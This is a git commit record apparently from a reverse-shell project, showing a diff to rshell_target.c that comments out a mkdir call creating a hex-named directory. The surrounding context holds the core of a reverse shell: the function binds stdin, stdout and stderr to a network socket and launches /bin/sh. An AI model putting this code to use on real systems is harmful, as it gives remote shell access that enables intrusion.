7c6d6d3f74cd4b00d49073b0b802f9ebdde3c29e
Wesley Hamburger <wezham1@gmail.com>
2019-08-11 11:18:39 +1000

    Update rshell_target.c

--- src/bin/rshell_target.c
+++ src/bin/rshell_target.c
@@ -44,7 +44,7 @@ void execute_shell(int sock){
     dup2(sock, 0); //stdin
     dup2(sock, 1); //stdout
     dup2(sock, 2); //stderr
-    mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
+    //mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
     system("/bin/sh");
 }
 
